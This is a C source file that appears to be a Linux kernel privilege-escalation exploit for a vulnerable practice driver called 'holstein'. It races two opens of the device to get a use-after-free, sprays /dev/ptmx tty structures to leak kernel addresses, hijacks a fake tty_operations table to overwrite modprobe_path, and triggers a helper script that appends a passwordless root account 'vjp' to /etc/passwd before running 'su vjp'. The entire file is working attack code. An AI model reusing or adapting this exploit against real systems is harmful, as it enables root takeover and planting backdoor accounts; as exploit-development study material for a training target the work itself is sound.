#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <stddef.h>
#include "tty.h"
#define PAGE 0x1000
#define log_info(...) { \
    printf("[*] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define log_err(...) { \
    printf("[!] "); \
    printf(__VA_ARGS__); \
    putchar('\n'); \
};
#define errExit(...){ \
    log_err(__VA_ARGS__); \
    exit(-1); \
};
u_int64_t user_ip;
u_int64_t user_cs;
u_int64_t user_rflags;
u_int64_t user_sp;
u_int64_t user_ss;
void get_shell(){
    if(getuid()){
        puts("Cuts");
        exit(-1);
    }
    log_info("Rooted!");
    char *argv[]={"/bin/sh",NULL};
    char *envp[]={NULL};
    execve(argv[0],argv,envp);
}
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    user_ip = get_shell;
    log_info("Saved user state");
}

#define pause() getchar()
#define DEVICE_NAME "holstein"
#define BUFFER_SIZE 0x400

int global_fd;
// void open_dev(){
//     global_fd = open("/dev/"DEVICE_NAME,O_RDWR);
//     if(global_fd < 0)
//         errExit("open");
//     log_info("Opened dev file");
// }
_Bool win;
void* race(void){
    while(1){
        while(!win){
            int fd = open("/dev/"DEVICE_NAME,O_RDWR);
            if(fd == 4) win = 1;
            if(win == 0 & fd !=-1) close(fd);
        }
        if(write(3,"A",1)!=1 || write(4,"A",1)!=1){
            close(3);
            close(4);
            win = 0;
        }
        else
            break;
    }
    return NULL;
}
char buf[BUFFER_SIZE];
int ptmx_fd;
int64_t _text,g_buf,modprobe_path;
int main(int argc,char** argv,char **envp){
    system("echo -e \"#!/bin/sh\necho 'vjp::0:0:root:/:/bin/sh' >> /etc/passwd\" > /tmp/vjp");
    system("chmod +x /tmp/vjp");
    pthread_t thread1,thread2;
    pthread_create(&thread1,NULL,race,NULL);
    pthread_create(&thread2,NULL,race,NULL);
    pthread_join(thread1,NULL);
    pthread_join(thread2,NULL);
    int fd1 = 3;
    int fd2 = 4;
    write(fd1,"Successfully dupping fd",24);
    read(fd2,buf,BUFFER_SIZE);
    log_info("%s",buf);
    close(fd2);
    ptmx_fd = open("/dev/ptmx",O_RDWR);
    if(ptmx_fd < 0)
        errExit("ptmx");
    read(fd1,buf,BUFFER_SIZE);
    int64_t* leak = (int64_t* )buf;
    if(leak[0] != 0x100005401)
        errExit("Wrong :(");
    _text = leak[3]-0xc3afe0;
    g_buf = leak[7]-0x38;
    log_info("_text @ 0x%lx",_text);
    log_info("g_buf = 0x%lx",g_buf);
    modprobe_path = _text + 0xe384c0;
    struct tty_operations fake_tty = {0};
    fake_tty.ioctl = _text + 0xb8cb5; //mov qword ptr [rdx], rsi ; ret
    memcpy(&buf[0x2e0],&fake_tty,sizeof(struct tty_operations));
    leak[3]=g_buf+0x2e0;
    write(fd1,buf,sizeof(buf));
    int32_t* p = (int32_t* )"/tmp/vjp";
    ioctl(ptmx_fd,p[0],modprobe_path);
    ioctl(ptmx_fd,p[1],modprobe_path+4);
    system("echo -e '\x13\x37\x42\x42' > /tmp/pwn" ); //Non-ascii for /tmp/pwn
    system("chmod +x /tmp/pwn"); 
    system("/tmp/pwn" );  // trigger call modprobe_path
    system("cat /etc/passwd");
    system("su vjp");
    
};
